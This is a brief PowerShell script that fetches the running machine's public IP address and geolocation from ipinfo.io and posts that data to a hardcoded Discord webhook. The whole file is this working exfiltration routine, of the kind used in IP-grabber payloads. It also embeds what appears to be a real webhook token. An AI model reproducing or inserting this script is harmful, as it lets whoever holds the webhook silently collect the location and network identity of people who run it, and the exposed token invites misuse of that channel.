# Discord webhook URL
$webhookUrl = "https://discord.com/api/webhooks/1407082358372433932/5PMNct5-2wHoXcwOW9DYgsdfmFZSHAVipvJ7-ZiZkHYYu3B1nP_ftdm9NpoI809FbyLs"

# Get IP info from ipinfo.io
$response = curl -s https://ipinfo.io | Out-String

# Prepare payload (escape quotes)
$payload = @{
    content = $response
} | ConvertTo-Json

# Send to Discord webhook
Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json"
